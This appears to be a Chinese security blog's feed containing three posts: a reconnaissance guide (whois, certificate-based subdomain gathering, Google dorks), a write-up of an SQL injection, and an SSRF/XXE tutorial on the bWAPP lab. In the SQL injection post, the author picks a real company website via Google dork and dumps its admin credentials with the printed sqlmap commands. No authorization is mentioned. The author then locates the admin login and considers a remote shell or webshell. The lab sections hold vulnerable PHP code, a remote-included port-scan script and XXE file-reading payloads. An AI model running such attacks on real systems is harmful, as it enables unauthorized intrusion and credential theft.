alt="Xnip2020-06-14_23-05-08.jpg"></p><p>进行邮箱反查</p><p><img src="https://i.loli.net/2020/06/14/v7J9WhO6NB8XHCt.jpg" alt="Xnip2020-06-14_23-07-22.jpg"></p><h2 id="笨米Benmi-com"><a href="#笨米Benmi-com" class="headerlink" title="笨米Benmi.com"></a>笨米Benmi.com</h2><p>URL：<a href="https://www.benmi.com/">https://www.benmi.com/</a></p><p>![image-20200614231313122](/Users/p0wer_shell/Library/Application Support/typora-user-images/image-20200614231313122.png)</p><p>笨米同样可以进行whois反查</p><h1 id="0x02-了解目标组织架构"><a href="#0x02-了解目标组织架构" class="headerlink" title="0x02 了解目标组织架构"></a>0x02 了解目标组织架构</h1><p>一般情况下目标的主站都是十分安全的，这时从主站下手明显不是一个明智的选择，我们可以考虑目标站点的子公司或者分支机构。一般在目标站点的主页中都会包含这类子公司或者分支机构的大概信息（大点的集团公司官网基本都有集团网站群），下面以公司网站举例：</p><p><img src="https://i.loli.net/2020/06/14/3VHd4A1PSw6qhBj.jpg" alt="Xnip2020-06-14_23-21-58.jpg"></p><p>可见公司的架构清晰可见，前期了解目标站点或公司的架构对后期渗透的方向很有帮助！</p><h1 id="0x03-通过https证书收集二级域名"><a href="#0x03-通过https证书收集二级域名" class="headerlink" title="0x03 通过https证书收集二级域名"></a>0x03 通过https证书收集二级域名</h1><h2 id="手动收集二级域名"><a href="#手动收集二级域名" class="headerlink" title="手动收集二级域名"></a>手动收集二级域名</h2><p><img src="https://i.loli.net/2020/06/14/HGjQV58odM9gKLZ.png" alt="图片 1.png"></p><p><img src="https://i.loli.net/2020/06/14/XrC5fgajJE8oWUR.png" alt="图片 2.png"></p><p>得到二级域名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">DNS Name&#x3D;baidu.com</span><br><span class="line">DNS Name&#x3D;click.hm.baidu.com</span><br><span class="line">DNS Name&#x3D;cm.pos.baidu.com</span><br><span class="line">DNS Name&#x3D;log.hm.baidu.com</span><br><span class="line">DNS Name&#x3D;update.pan.baidu.com</span><br><span class="line">DNS Name&#x3D;wn.pos.baidu.com</span><br><span class="line">DNS Name&#x3D;*.91.com</span><br><span class="line">DNS Name&#x3D;*.aipage.cn</span><br><span class="line">DNS Name&#x3D;*.aipage.com</span><br><span class="line">DNS Name&#x3D;*.apollo.auto</span><br><span class="line">DNS Name&#x3D;*.baidu.com</span><br><span class="line">DNS Name&#x3D;*.baidubce.com</span><br><span class="line">DNS Name&#x3D;*.baiducontent.com</span><br><span class="line">DNS Name&#x3D;*.baidupcs.com</span><br><span class="line">DNS Name&#x3D;*.baidustatic.com</span><br><span class="line">DNS Name&#x3D;*.baifae.com</span><br><span class="line">DNS Name&#x3D;*.baifubao.com</span><br><span class="line">DNS Name&#x3D;*.bce.baidu.com</span><br><span class="line">DNS Name&#x3D;*.bcehost.com</span><br><span class="line">DNS Name&#x3D;*.bdimg.com</span><br><span class="line">DNS Name&#x3D;*.bdstatic.com</span><br><span class="line">DNS Name&#x3D;*.bdtjrcv.com</span><br><span class="line">DNS Name&#x3D;*.bj.baidubce.com</span><br><span class="line">DNS Name&#x3D;*.chuanke.com</span><br><span class="line">DNS Name&#x3D;*.dlnel.com</span><br><span class="line">DNS Name&#x3D;*.dlnel.org</span><br><span class="line">DNS Name&#x3D;*.dueros.baidu.com</span><br><span class="line">DNS Name&#x3D;*.eyun.baidu.com</span><br><span class="line">DNS Name&#x3D;*.fanyi.baidu.com</span><br><span class="line">DNS Name&#x3D;*.gz.baidubce.com</span><br><span class="line">DNS Name&#x3D;*.hao123.baidu.com</span><br><span class="line">DNS Name&#x3D;*.hao123.com</span><br><span class="line">DNS Name&#x3D;*.hao222.com</span><br><span class="line">DNS Name&#x3D;*.im.baidu.com</span><br><span class="line">DNS Name&#x3D;*.map.baidu.com</span><br><span class="line">DNS Name&#x3D;*.mbd.baidu.com</span><br><span class="line">DNS Name&#x3D;*.mipcdn.com</span><br><span class="line">DNS Name&#x3D;*.news.baidu.com</span><br><span class="line">DNS Name&#x3D;*.nuomi.com</span><br><span class="line">DNS Name&#x3D;*.safe.baidu.com</span><br><span class="line">DNS Name&#x3D;*.smartapps.cn</span><br><span class="line">DNS Name&#x3D;*.ssl2.duapps.com</span><br><span class="line">DNS Name&#x3D;*.su.baidu.com</span><br><span class="line">DNS Name&#x3D;*.trustgo.com</span><br><span class="line">DNS Name&#x3D;*.xueshu.baidu.com</span><br><span class="line">DNS Name&#x3D;apollo.auto</span><br><span class="line">DNS Name&#x3D;baifae.com</span><br><span class="line">DNS Name&#x3D;baifubao.com</span><br><span class="line">DNS Name&#x3D;dwz.cn</span><br><span class="line">DNS Name&#x3D;mct.y.nuomi.com</span><br><span class="line">DNS Name&#x3D;www.baidu.cn</span><br><span class="line">DNS Name&#x3D;www.baidu.com.cn</span><br></pre></td></tr></table></figure><h2 id="自动化网站收集二级域名"><a href="#自动化网站收集二级域名" class="headerlink" title="自动化网站收集二级域名"></a>自动化网站收集二级域名</h2><p>URL：<a href="https://crt.sh/">https://crt.sh/</a></p><p><img src="https://i.loli.net/2020/06/14/z4UMeY5ouT3fjZk.jpg" alt="Xnip2020-06-14_23-35-46.jpg"></p><p>Sublime数据处理方法：</p><p>选中关键词后Alt+f3即多行编辑，将光标移动至关键词后面，shift+home即选行首到关键词位置，重复上述动作，即可获取二级域名。然后使用excel–&gt;数据 –&gt;去除重复项，得到完整的二级域名。</p><h1 id="0x04-DNS解析记录"><a href="#0x04-DNS解析记录" class="headerlink" title="0x04 DNS解析记录"></a>0x04 DNS解析记录</h1><p>URL：<a href="https://securitytrails.com/dns-trails">https://securitytrails.com/dns-trails</a></p><h1 id="0x05-Google语法"><a href="#0x05-Google语法" class="headerlink" title="0x05 Google语法"></a>0x05 Google语法</h1><p>常用举例：具体使用方法自行百度</p><p>inurl:admin/login.php         inurl：在url中搜索关键词</p><p>Intitle:管理后台         intitle:在标题中搜索</p><p>Intext:admin/login.php         intext:在body中搜索</p><p>site:sangfor.com.cn         site:域名中包含sangfor.com.cn</p><p>Filetype:xlsx         搜索文件类型</p><h1 id="0x06-子域名爆破"><a href="#0x06-子域名爆破" class="headerlink" title="0x06 子域名爆破"></a>0x06 子域名爆破</h1><p>常用工具：Layer子域名挖掘机</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-whois查询&quot;&gt;&lt;a href=&quot;#0x01-whois查询&quot; class=&quot;headerlink&quot; title=&quot;0x01 whois查询&quot;&gt;&lt;/a&gt;0x01 whois查询&lt;/h1&gt;&lt;p&gt;whois查询是用来查询&lt;a href=&quot;https://b</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="信息收集" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    <category term="工具" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>记录一次最基本的SQL注入实战</title>
    <link href="http://yoursite.com/2020/06/03/sql-test/"/>
    <id>http://yoursite.com/2020/06/03/sql-test/</id>
    <published>2020-06-03T05:40:55.000Z</published>
    <updated>2020-06-03T10:24:01.103Z</updated>
    
    <content type="html"><![CDATA[<h1 id="实战过程"><a href="#实战过程" class="headerlink" title="实战过程"></a>实战过程</h1><p>今天闲得无聊，随便用Google hack语法找了一个基于PHP的某公司网站，进行一下测试。可能存在SQL注入的网站如下图：</p><p><img src="https://i.loli.net/2020/06/03/MtuEiq4HZRBFe7z.jpg" alt="Xnip2020-06-03_15-31-11.jpg"></p><p>进行一下测试，构造查询语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2%27</span><br></pre></td></tr></table></figure><p>页面返回结果如下图：</p><p><img src="https://i.loli.net/2020/06/03/ioGyDZ89JmWEdkQ.jpg" alt="Xnip2020-06-03_15-34-28.jpg"></p><p>经过测试发现，不管如何构造URL，此网站页面只有两种返回结果，既页面返回正常和页面返回不正常。因此我第一个想到的是基于布尔的盲注。所以直接在kali中上sqlmap，payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;www.diffuser.com.tw&#x2F;about.php?id&#x3D;2&quot; --technique B --batch --dbs</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;www.diffuser.com.tw&#x2F;about.php?id&#x3D;2&quot; --technique B --batch -D jiuyu_jiuyu --tables</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;www.diffuser.com.tw&#x2F;about.php?id&#x3D;2&quot; --technique B --batch -D jiuyu_jiuyu -T admin --columns</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;www.diffuser.com.tw&#x2F;about.php?id&#x3D;2&quot; --technique B --batch -D jiuyu_jiuyu -T admin -C username,password --dump</span><br></pre></td></tr></table></figure><p>最后得到username和password</p><p><img src="https://i.loli.net/2020/06/03/d2CxS3AMUOIca4z.jpg" alt="Xnip2020-06-03_13-53-09.jpg"></p><p>很遗憾啊，用户kele和admin的密码都是经过md5加密后的结果，还很有可能加密了不止一次。我们只能碰碰运气去在线的解密网站试试了</p><p><img src="https://i.loli.net/2020/06/03/Y6XBjghMtkRbLaI.jpg" alt="Xnip2020-06-03_15-44-26.jpg"></p><p>很可惜并不能解出来两个用户的密码。但是我们可以思考一下，如果得到的用户的密码铭文，我们下一步要做什么。肯定是找后台登陆，我们用御剑扫一下后台，看能不能扫到登陆口</p><p><img src="https://i.loli.net/2020/06/03/6snX2pGfb5BErkt.jpg" alt="Xnip2020-06-03_14-24-00.jpg"></p><p><img src="https://i.loli.net/2020/06/03/Dgb9OrL2uRec1Gv.jpg" alt="Xnip2020-06-03_14-24-50.jpg"></p><p>果然扫到了，如果知道了用户名密码我们就可以登陆了！</p><h1 id="思考与总结"><a href="#思考与总结" class="headerlink" title="思考与总结"></a>思考与总结</h1><ol><li>如果用户密码解不出来，要怎么办？</li><li>是不是可以转换思路，用- -is-dba看看当前的mysql权限直接，如果- -is-dba为true则可以直接使用- -os-shell反弹shell执行系统命令，如果- -is-dba为false，那么可以试试提权？</li><li>能不能写入一句话木马呢？</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;实战过程&quot;&gt;&lt;a href=&quot;#实战过程&quot; class=&quot;headerlink&quot; title=&quot;实战过程&quot;&gt;&lt;/a&gt;实战过程&lt;/h1&gt;&lt;p&gt;今天闲得无聊，随便用Google hack语法找了一个基于PHP的某公司网站，进行一下测试。可能存在SQL注入的网站如下图：</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="实战" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E6%88%98/"/>
    
    
    <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>由BWAPP学习SSRF</title>
    <link href="http://yoursite.com/2020/06/01/ssrf/"/>
    <id>http://yoursite.com/2020/06/01/ssrf/</id>
    <published>2020-06-01T11:10:20.000Z</published>
    <updated>2020-06-01T12:59:52.297Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01浅谈SSRF"><a href="#0x01浅谈SSRF" class="headerlink" title="0x01浅谈SSRF"></a>0x01浅谈SSRF</h1><h2 id="SSRF的定义"><a href="#SSRF的定义" class="headerlink" title="SSRF的定义"></a>SSRF的定义</h2><p>SSRF(server-site request forery，服务端请求伪造)是一种构造请求，有服务端发起请求的安全漏洞。<font color='red'>一般情况下，SSRF的目标是与外部隔离的内网资源</font>（因为他是从内部系统访问的，所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人）</p><h2 id="SSRF的原理"><a href="#SSRF的原理" class="headerlink" title="SSRF的原理"></a>SSRF的原理</h2><p>服务端提供了从其他服务器获取数据的功能，但是没有对内网目标地址做过滤限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。为了便于理解我们可以举个例子：比如 ： A网站，是一个所有人都可以访问的外网网站，B网站是一个他们内部的OA网站。所以，我们普通用户只可以访问a网站，不能访问b网站。但是我们可以同过a网站做中间人，访问b网站，从而达到攻击b网站需求。</p><h2 id="SSRF的利用方式"><a href="#SSRF的利用方式" class="headerlink" title="SSRF的利用方式"></a>SSRF的利用方式</h2><ol><li>对外网，服务器所在内网，本地进行端口扫描，获取Banner信息，探测内网资源。</li><li>测试运行在内网或本地的应用程序。</li><li>利用file协议读取本地敏感文件等</li></ol><h1 id="0x02通过代码分析SSRF"><a href="#0x02通过代码分析SSRF" class="headerlink" title="0x02通过代码分析SSRF"></a>0x02通过代码分析SSRF</h1><h2 id="产生SSRF漏洞的函数以及代码分析"><a href="#产生SSRF漏洞的函数以及代码分析" class="headerlink" title="产生SSRF漏洞的函数以及代码分析"></a>产生SSRF漏洞的函数以及代码分析</h2><h3 id="file-get-content"><a href="#file-get-content" class="headerlink" title="file_get_content()"></a>file_get_content()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">//使用file_get_contents()函数构造ssrf。</span></span><br><span class="line">    <span class="comment">//下面代码的内容为：使用file_get_contents()函数从用户指定的url中获取图片，把图片用一个随机url保存然后展示给用户。</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&quot;url&quot;</span>])) &#123;</span><br><span class="line">        <span class="comment"># code...</span></span><br><span class="line">        $content = file_get_contents($_POST[<span class="string">&quot;url&quot;</span>]);    <span class="comment">//使用file_get_contents()函数获取url中的内容</span></span><br><span class="line">        $filename = <span class="string">&#x27;./images/&#x27;</span> . rand() . <span class="string">&#x27;.img&#x27;</span>;    <span class="comment">//构建保存文件的路径</span></span><br><span class="line">        file_put_contents($filename, $content);    <span class="comment">//将$content的内容写入$filename中</span></span><br><span class="line">        <span class="keyword">echo</span> $_POST[<span class="string">&quot;url&quot;</span>];</span><br><span class="line">        $img = <span class="string">&quot;&lt;img src=\&quot;&quot;</span>.filename.<span class="string">&quot;\&quot;/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;使用file_get_contents()函数构造ssrf&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> $img;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/06/01/jyUub2sIZQYWLR4.jpg" alt="Xnip2020-06-01_19-46-12.jpg"></p><h3 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$host=$_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">$fp = fsockopen(<span class="string">&quot;$host&quot;</span>, <span class="number">80</span>, $errno, $errstr, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!$fp) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;$errstr ($errno)&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $out = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">    $out .= <span class="string">&quot;Host: $host\r\n&quot;</span>;</span><br><span class="line">    $out .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    fwrite($fp, $out);</span><br><span class="line">    <span class="keyword">while</span> (!feof($fp)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> fgets($fp, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/06/01/hMXdyCjn1NigwD5.jpg" alt="Xnip2020-06-01_20-02-03.jpg"></p><h3 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;    <span class="comment">//调用curl库</span></span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">    &#125;</span><br><span class="line">    @$url = $_GET[<span class="string">&quot;url&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;试试读取文件吧&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">    curl($url);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/06/01/lq2UVjHN756YkIf.jpg" alt="Xnip2020-06-01_19-57-08.jpg"></p><p><font color='red'>curl_exec常见的利用方式是通过file，dict，gopher这三个协议来进行渗透</font></p><h1 id="0x03通过BWAPP学习SSRF"><a href="#0x03通过BWAPP学习SSRF" class="headerlink" title="0x03通过BWAPP学习SSRF"></a>0x03通过BWAPP学习SSRF</h1><h2 id="利用远程文件包含进行端口扫描（内网信息探测）"><a href="#利用远程文件包含进行端口扫描（内网信息探测）" class="headerlink" title="利用远程文件包含进行端口扫描（内网信息探测）"></a>利用远程文件包含进行端口扫描（内网信息探测）</h2><p>扫描端口php脚本：(21, 22, 23, 25, 53, 80, 110, 1433, 3306)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">bWAPP, or a buggy web application, is a free and open source deliberately insecure web application.</span></span><br><span class="line"><span class="comment">It helps security enthusiasts, developers and students to discover and to prevent web vulnerabilities.</span></span><br><span class="line"><span class="comment">bWAPP covers all major known web vulnerabilities, including all risks from the OWASP Top 10 project!</span></span><br><span class="line"><span class="comment">It is for educational purposes only.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Enjoy!</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Malik Mesellem</span></span><br><span class="line"><span class="comment">Twitter: <span class="doctag">@MME</span>_IT</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Â© 2013 MME BVBA. All rights reserved.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(\&quot;U 4r3 0wn3d by MME!!!\&quot;);&lt;/script&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">&quot;ip&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//list of port numbers to scan</span></span><br><span class="line">    $ports = <span class="keyword">array</span>(<span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">53</span>, <span class="number">80</span>, <span class="number">110</span>, <span class="number">1433</span>, <span class="number">3306</span>);</span><br><span class="line">    </span><br><span class="line">    $results = <span class="keyword">array</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">foreach</span>($ports <span class="keyword">as</span> $port)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($pf = @fsockopen($_REQUEST[<span class="string">&quot;ip&quot;</span>], $port, $err, $err_string, <span class="number">1</span>))</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            $results[$port] = <span class="literal">true</span>;</span><br><span class="line">            fclose($pf);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            $results[$port] = <span class="literal">false</span>;        </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">foreach</span>($results <span class="keyword">as</span> $port=&gt;$val)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        $prot = getservbyport($port,<span class="string">&quot;tcp&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Port $port ($prot): &quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($val)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;span style=\&quot;color:green\&quot;&gt;OK&lt;/span&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;span style=\&quot;color:red\&quot;&gt;Inaccessible&lt;/span&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/06/01/ujJfOPSUhtGRzZ4.jpg" alt="Xnip2020-06-01_20-16-23.jpg"></p><p>通过可控参数language远程包含php脚本，进行内网端口扫描。</p><p><img src="https://i.loli.net/2020/06/01/d4lAvzhTQnZw8Ru.jpg" alt="Xnip2020-06-01_20-20-24.jpg"></p><p><img src="https://i.loli.net/2020/06/01/3v1VFPNqDfu4Rwo.jpg" alt="Xnip2020-06-01_20-21-26.jpg"></p><p>成功探测内网192.168.1.100端口信息。</p><h2 id="利用XXE获取敏感文件中的内容（获取文件内容）"><a href="#利用XXE获取敏感文件中的内容（获取文件内容）" class="headerlink" title="利用XXE获取敏感文件中的内容（获取文件内容）"></a>利用XXE获取敏感文件中的内容（获取文件内容）</h2><p>构造payload，使用http协议读取172.16.38.153下robots.txt</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">hacker</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://172.16.38.153/bWAPP/bWAPP/robots.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span><span class="symbol">&amp;hacker;</span><span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>Any bugs?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/06/01/5f7Koq8lJHMvI4Y.jpg" alt="Xnip2020-06-01_20-32-39.jpg"></p><p>成功读取robots.txt</p><p>使用php协议获取172.16.38.153/bWAPP/bWAPP/passwords/heroes.xml中的经过base64编码的数据</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">hacker</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=http://172.16.38.153/bWAPP/bWAPP/passwords/heroes.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span><span class="symbol">&amp;hacker;</span><span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>Any bugs?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/06/01/8bszNq9gG1x6o5J.jpg" 